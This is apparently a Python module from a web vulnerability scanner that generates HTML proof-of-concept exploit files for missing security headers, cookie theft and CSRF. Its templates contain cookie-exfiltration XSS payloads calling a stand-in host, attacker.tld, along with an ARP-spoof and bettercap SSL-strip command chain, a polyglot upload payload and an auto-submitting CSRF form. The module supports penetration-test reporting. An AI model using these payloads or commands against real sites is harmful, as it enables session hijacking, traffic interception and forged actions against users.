"""
cyberm4fia-scanner - Automated PoC (Proof of Concept) Generator

Generates self-contained HTML PoC files for each missing-security-header
exploit primitive (clickjacking, MIME confusion, HSTS strip, referrer leak,
permissions abuse, CSP-less XSS, cookie theft chain) plus CSRF.

Dispatch is driven by ``modules.header_exploit_map`` so adding a new header
mapping automatically picks up the right PoC template here.
"""

import hashlib
import os
from urllib.parse import urlparse

from modules.header_exploit_map import lookup as _header_lookup
from utils.colors import log_info, log_success


# ── Public entry point ──────────────────────────────────────────────────────


def generate_pocs(findings: list, scan_dir: str):
    """Analyze findings and generate relevant PoC files."""
    poc_dir = os.path.join(scan_dir, "pocs")

    # (poc_kind, finding) tuples — deduped per (kind, url) so we don't write
    # the same PoC five times for the same target.
    seen: set[tuple[str, str]] = set()
    header_jobs: list[tuple[str, dict]] = []
    csrf_jobs: list[dict] = []
    cookie_jobs: list[dict] = []

    has_xss = any(
        str(f.get("type", "")).lower().startswith("xss")
        or "xss" in str(f.get("type", "")).lower()
        for f in findings
    )

    for f in findings:
        ftype = str(f.get("type", "") or "")
        url = f.get("url", "")
        if ftype == "Missing_Security_Header":
            poc_kind = f.get("poc_kind")
            if not poc_kind:
                # Fallback: derive from header name if the finding wasn't
                # enriched (e.g. came from a legacy scan path).
                exploit = _header_lookup(f.get("param", ""))
                poc_kind = exploit.poc_kind if exploit else ""
            if not poc_kind:
                continue
            key = (poc_kind, url)
            if key in seen:
                continue
            seen.add(key)
            header_jobs.append((poc_kind, f))
        elif ftype in _PROMOTED_TYPE_TO_POC_KIND:
            # Active verifier already upgraded this finding's type from
            # Missing_Security_Header to its *_Exploitable form. We still
            # want a PoC for the underlying header gap — route by the
            # promoted-type → kind table.
            poc_kind = _PROMOTED_TYPE_TO_POC_KIND[ftype]
            key = (poc_kind, url)
            if key in seen:
                continue
            seen.add(key)
            header_jobs.append((poc_kind, f))
        elif ftype == "CSRF" or ftype.startswith("CSRF"):
            csrf_jobs.append(f)
        elif ftype == "Insecure_Cookie" and has_xss:
            cookie_jobs.append(f)

    if not (header_jobs or csrf_jobs or cookie_jobs):
        return

    os.makedirs(poc_dir, exist_ok=True)
    log_info(f"Generating Offline PoC Exploits in {poc_dir}...")

    for poc_kind, finding in header_jobs:
        _dispatch_header_poc(poc_kind, finding, poc_dir)

    for finding in csrf_jobs:
        url = finding.get("url", "")
        if not url:
            continue
        filename = os.path.join(poc_dir, f"csrf_{_safe_name(url)}.html")
        _create_csrf_poc(finding, filename)

    for finding in cookie_jobs:
        url = finding.get("url", "")
        if not url:
            continue
        filename = os.path.join(poc_dir, f"cookie_theft_{_safe_name(url)}.html")
        _create_cookie_theft_poc(finding, filename)


# ── Dispatch + helpers ──────────────────────────────────────────────────────


_DISPATCH = {
    "clickjacking":     ("clickjacking",     "_create_clickjacking_poc"),
    "csp_xss":          ("csp_xss",          "_create_csp_xss_poc"),
    "mime_confusion":   ("mime_confusion",   "_create_mime_confusion_poc"),
    "hsts_downgrade":   ("hsts_downgrade",   "_create_hsts_downgrade_poc"),
    "referrer_leak":    ("referrer_leak",    "_create_referrer_leak_poc"),
    "permissions_abuse": ("permissions_abuse", "_create_permissions_abuse_poc"),
}

# After active verifiers promote a header finding, ftype no longer reads
# "Missing_Security_Header" — it reads e.g. "Clickjacking_Exploitable".
# We still want to ship the matching PoC; this table reverses the lookup.
_PROMOTED_TYPE_TO_POC_KIND = {
    "Clickjacking_Exploitable":   "clickjacking",
    "HSTS_Downgrade_Exploitable": "hsts_downgrade",
    "MIME_Confusion_Exploitable": "mime_confusion",
    "Referrer_Leak_Exploitable":  "referrer_leak",
    "Permissions_Policy_Abuse":   "permissions_abuse",
    # CSP_Bypass is its own emitter (modules/csp_bypass.py) but the
    # exploitation primitive is identical — generate the XSS demo PoC.
    "CSP_Bypass":                 "csp_xss",
}


def _dispatch_header_poc(poc_kind: str, finding: dict, poc_dir: str) -> None:
    url = finding.get("url", "")
    if not url:
        return
    spec = _DISPATCH.get(poc_kind)
    if not spec:
        return
    prefix, func_name = spec
    func = globals().get(func_name)
    if func is None:
        return
    filename = os.path.join(poc_dir, f"{prefix}_{_safe_name(url)}.html")
    func(url, filename) if func.__code__.co_argcount == 2 else func(finding, filename)


def _safe_name(url: str) -> str:
    parsed = urlparse(url)
    raw = (parsed.netloc + parsed.path).replace(":", "_").replace("/", "_").strip("_") or "target"
    if len(raw) > 80:
        h = hashlib.sha1(raw.encode()).hexdigest()[:8]
        raw = raw[:72] + "_" + h
    return raw


def _write(filepath: str, content: str, label: str) -> None:
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)
    log_success(f"[PoC] Generated {label}: {os.path.basename(filepath)}")


# ── PoC templates ───────────────────────────────────────────────────────────


def _create_clickjacking_poc(url: str, filepath: str):
    """Clickjacking iframe overlay PoC (XFO / frame-ancestors missing)."""
    poc = f"""<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - {url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; background:#f4f4f4; text-align:center; margin-top:50px; }}
        .header {{ background:#ff4757; color:white; padding:20px; border-radius:8px; display:inline-block; }}
        .iframe-container {{ position:relative; width:800px; height:600px; margin:20px auto; border:2px dashed #333; }}
        iframe {{ width:100%; height:100%; opacity:0.5; /* 0.001 in real attack */ z-index:2; position:absolute; top:0; left:0; border:none; }}
        .victim-button {{ position:absolute; top:300px; left:350px; z-index:1; padding:15px 30px; font-size:18px; background:#2ed573; color:white; border:none; cursor:pointer; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Clickjacking PoC</h1>
        <p>Target: <strong>{url}</strong></p>
        <p>X-Frame-Options and CSP frame-ancestors are missing — the page is framable.</p>
    </div>
    <div class="iframe-container">
        <button class="victim-button">Win a Free iPhone!</button>
        <iframe src="{url}"></iframe>
    </div>
</body>
</html>"""
    _write(filepath, poc, "Clickjacking")


def _create_csp_xss_poc(url: str, filepath: str):
    """CSP-less XSS exfiltration PoC (no script-src / inline blocked)."""
    poc = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSP-Bypass XSS PoC - {url}</title>
</head>
<body>
    <h2>CSP Missing → XSS Exfiltration PoC</h2>
    <p>Target: <strong>{url}</strong></p>
    <p>The target ships no Content-Security-Policy header. Any reflected/stored
       input on the target can deliver this payload without CSP blocking it.</p>
    <hr>
    <h3>Payload to inject in a reflected/stored sink:</h3>
    <pre>&lt;script&gt;fetch('https://attacker.tld/log?c='+encodeURIComponent(document.cookie))&lt;/script&gt;</pre>
    <h3>Inline render test (open in browser):</h3>
    <iframe src="{url}" sandbox="allow-scripts" style="width:100%;height:300px;border:1px solid #333"></iframe>
    <p><i>If a CSP were present, the script and the iframe-injected payload would be blocked.</i></p>
</body>
</html>"""
    _write(filepath, poc, "CSP XSS")


def _create_mime_confusion_poc(url: str, filepath: str):
    """MIME confusion via polyglot upload PoC (X-Content-Type-Options missing)."""
    poc = f"""<!DOCTYPE html>
<html>
<head>
    <title>MIME Confusion PoC - {url}</title>
</head>
<body>
    <h2>MIME Confusion (No X-Content-Type-Options: nosniff)</h2>
    <p>Target: <strong>{url}</strong></p>
    <p>Without <code>nosniff</code>, browsers (especially legacy IE/Edge and
       in some cases Chrome with mismatched Content-Type) sniff the body and
       can execute uploaded files as HTML/JS.</p>
    <hr>
    <h3>Polyglot upload payload (GIF89a + HTML):</h3>
    <pre>GIF89a;
&lt;script&gt;alert(document.domain)&lt;/script&gt;</pre>
    <p>Steps:</p>
    <ol>
        <li>Save the snippet above as <code>x.gif</code>.</li>
        <li>Upload via any user-content endpoint (avatar, attachment).</li>
        <li>Open the returned file URL directly: if it executes JS, MIME sniffing succeeded.</li>
    </ol>
    <h3>Sniff probe (open in browser):</h3>
    <script src="{url}"></script>
    <p><i>If a dialog appears, the target served user-controlled bytes without
       <code>Content-Type</code> enforcement.</i></p>
</body>
</html>"""
    _write(filepath, poc, "MIME Confusion")


def _create_hsts_downgrade_poc(url: str, filepath: str):
    """HSTS / SSL strip scenario document (not browser-executable)."""
    parsed = urlparse(url)
    http_url = url.replace("https://", "http://", 1)
    poc = f"""<!DOCTYPE html>
<html>
<head>
    <title>HSTS Downgrade / SSL Strip Scenario - {url}</title>
</head>
<body>
    <h2>HSTS Missing — SSL Strip Scenario</h2>
    <p>Target: <strong>{url}</strong></p>
    <p>The target responds without <code>Strict-Transport-Security</code>.
       A network-position attacker can downgrade the initial navigation
       request to HTTP and strip the upgrade to HTTPS.</p>
    <hr>
    <h3>Pre-conditions</h3>
    <ul>
        <li>Attacker on the victim's L2/L3 path (same Wi-Fi, rogue AP, ISP, captive portal).</li>
        <li>Victim has not previously pinned this host via HSTS preload list.</li>
    </ul>
    <h3>Command zinciri (lab)</h3>
    <pre>
# 1. enable IP forwarding
sysctl -w net.ipv4.ip_forward=1

# 2. ARP-spoof victim into routing via attacker
arpspoof -i wlan0 -t {parsed.hostname or 'victim'} {parsed.hostname or 'gateway'}

# 3. Rewrite HTTPS links to HTTP (sslstrip2 / bettercap)
bettercap -iface wlan0 -caplet http-req-dump

# 4. Capture plaintext Set-Cookie on the downgraded request
tail -f /tmp/bettercap-*.log | grep -i set-cookie
</pre>
    <h3>Downgrade target URL</h3>
    <p>Force the victim to: <a href="{http_url}">{http_url}</a></p>
    <h3>HSTS preload check</h3>
    <pre>curl -sI 'https://hstspreload.org/api/v2/status?domain={parsed.hostname or ''}'</pre>
    <p><i>If the API replies <code>"status": "unknown"</code> the domain is
       not in the Chromium preload list and the first hit is downgradable.</i></p>
</body>
</html>"""
    _write(filepath, poc, "HSTS Downgrade")


def _create_referrer_leak_poc(url: str, filepath: str):
    """Referrer-Policy leak PoC (Referer carries sensitive URL to 3rd party)."""
    poc = f"""<!DOCTYPE html>
<html>
<head>
    <title>Referrer-Policy Leak PoC - {url}</title>
</head>
<body>
    <h2>Referrer-Policy Missing — Cross-Origin URL Leak</h2>
    <p>Sensitive page: <strong>{url}</strong></p>
    <p>The site does not set <code>Referrer-Policy</code> so browsers default
       to <code>no-referrer-when-downgrade</code> for HTTPS→HTTPS: the full
       URL (including query string secrets like OAuth codes, password-reset
       tokens, share-link IDs) is sent in the <code>Referer</code> header to
       any third-party asset embedded on the page.</p>
    <hr>
    <h3>Victim flow</h3>
    <ol>
        <li>Victim opens a URL like
            <code>{url}?reset_token=AAA-BBB-CCC</code> or
            <code>{url}#access_token=eyJ...</code>.</li>
        <li>The page loads a 3rd-party image / analytics / font hosted on
            <code>attacker.tld</code>.</li>
        <li>Browser sends <code>Referer: {url}?reset_token=AAA-BBB-CCC</code>
            to <code>attacker.tld</code> in cleartext to that origin.</li>
    </ol>
    <h3>Test snippet</h3>
    <pre>&lt;img src="https://attacker.tld/r.gif" referrerpolicy="unsafe-url"&gt;</pre>
    <h3>Self-check</h3>
    <p>Run <code>nc -lvnp 80</code> on a controlled domain, then visit the
       page above with a token in the URL — the captured request's
       <code>Referer</code> header will contain the secret.</p>
</body>
</html>"""
    _write(filepath, poc, "Referrer Leak")


def _create_permissions_abuse_poc(url: str, filepath: str):
    """Permissions-Policy abuse PoC (3rd-party iframe with allow=)."""
    poc = f"""<!DOCTYPE html>
<html>
<head>
    <title>Permissions-Policy Abuse PoC - {url}</title>
</head>
<body>
    <h2>Permissions-Policy Missing — 3rd-Party Feature Abuse</h2>
    <p>Target: <strong>{url}</strong></p>
    <p>Without an explicit <code>Permissions-Policy</code> header the target
       allows embedding pages to negotiate access to powerful features
       (camera, microphone, geolocation, payment) via the <code>allow</code>
       attribute on <code>&lt;iframe&gt;</code>.</p>
    <hr>
    <h3>Embed scenario</h3>
    <iframe src="{url}"
            allow="camera; microphone; geolocation; payment; usb; midi"
            style="width:100%;height:400px;border:2px solid #c00"></iframe>
    <h3>What the attacker site can do</h3>
    <ul>
        <li>Run a JS shim inside the iframe (via a separate XSS or trusted-but-
            misconfigured route) that calls <code>navigator.mediaDevices.getUserMedia</code>.</li>
        <li>Because the parent allowed the feature, the prompt appears
            attributed to the *target's* origin — phishing-grade trust.</li>
    </ul>
    <h3>Remediation snippet</h3>
    <pre>Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=(), midi=()</pre>
</body>
</html>"""
    _write(filepath, poc, "Permissions Abuse")


def _create_cookie_theft_poc(finding: dict, filepath: str):
    """XSS → cookie exfil chain (Insecure_Cookie missing HttpOnly + an XSS)."""
    url = finding.get("url", "")
    cookie_name = finding.get("param") or finding.get("cookie") or "session"
    poc = f"""<!DOCTYPE html>
<html>
<head>
    <title>Cookie Theft Chain PoC - {url}</title>
</head>
<body>
    <h2>XSS + Insecure Cookie → Session Hijack</h2>
    <p>Target: <strong>{url}</strong></p>
    <p>The target sets <code>{cookie_name}</code> without <code>HttpOnly</code>.
       Combined with any XSS sink on the same origin, the cookie can be read
       by JavaScript and exfiltrated to an attacker endpoint.</p>
    <hr>
    <h3>Exfil payload</h3>
    <pre>&lt;script&gt;
new Image().src = 'https://attacker.tld/c?'
  + encodeURIComponent(document.cookie);
&lt;/script&gt;</pre>
    <h3>End-to-end</h3>
    <ol>
        <li>Deliver the payload via the existing XSS sink (URL param, stored field).</li>
        <li>Victim opens the URL while logged in — browser executes the script.</li>
        <li><code>document.cookie</code> contains <code>{cookie_name}=...</code>.</li>
        <li>Attacker replays the cookie value in <code>Cookie:</code> header from a
            fresh client to gain a valid authenticated session.</li>
    </ol>
    <h3>Remediation</h3>
    <pre>Set-Cookie: {cookie_name}=...; HttpOnly; Secure; SameSite=Lax</pre>
</body>
</html>"""
    _write(filepath, poc, "Cookie Theft Chain")


def _create_csrf_poc(finding: dict, filepath: str):
    """Auto-submitting CSRF form PoC (preserved from original)."""
    url = finding.get("url", "")
    method = (finding.get("method") or "POST").upper()
    fields = finding.get("form_fields") or finding.get("params") or {}
    if isinstance(fields, list):
        fields = {item.get("name", f"field{i}"): item.get("value", "") for i, item in enumerate(fields)}

    rows = "".join(
        f'    <input type="hidden" name="{name}" value="{value}" />\n'
        for name, value in fields.items()
    ) or '    <!-- No captured form fields; supply manually before delivery. -->\n'

    poc = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - {url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; background:#f4f4f4; padding:30px; }}
        .header {{ background:#ff4757; color:white; padding:16px; border-radius:6px; }}
        pre    {{ background:#222; color:#0f0; padding:14px; border-radius:6px; overflow:auto; }}
    </style>
</head>
<body>
    <div class="header">
        <h2>CSRF Vulnerability Proof of Concept</h2>
        <p>Target: <strong>{url}</strong></p>
        <p>Method: <strong>{method}</strong></p>
        <p>The target form does not enforce a CSRF token. Loading this page in
        an authenticated victim's browser will silently submit the request below.</p>
    </div>

    <h3>Auto-submitting form:</h3>
    <form id="csrf" action="{url}" method="{method.lower()}">
{rows}    </form>

    <h3>Captured fields:</h3>
    <pre>{fields if fields else '(none)'}</pre>

    <script>
        document.getElementById('csrf').submit();
    </script>
</body>
</html>"""
    _write(filepath, poc, "CSRF")
